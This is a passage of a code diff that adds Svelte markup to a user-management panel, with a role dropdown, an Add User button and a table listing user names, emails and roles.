+            <option value="viewer">Viewer</option>
+            <option value="operator">Operator</option>
+            <option value="security-admin">Security Admin</option>
+            <option value="admin">Admin</option>
+          </select>
+        </label>
+      </div>
+      <div class="actions users-form-actions">
+        <button type="button" class="action-btn primary" on:click={addUser}>Add User</button>
+      </div>
+      {#if userNotice}<p class="empty-row">{userNotice}</p>{/if}
+      <div class="table-wrap">
+        <table class="timeline-table">
+          <thead>
+            <tr><th>Name</th><th>Email</th><th>Role</th></tr>
+          </thead>
+          <tbody>
+            {#if userRows.length === 0}
+              <tr><td colspan="3" class="empty-row">No users added yet.</td></tr>
+            {:else}
+              {#each userRows as user}
+                <tr>
+                  <td>{user.name}</td>
+                  <td class="mono">{user.email}</td>
+                  <td>{user.role}</td>
+                </tr>
+              {/each}
+            {/if}
+          </tbody>
+        </table>
+      </div>
     </article>
   </section>
 {/if}
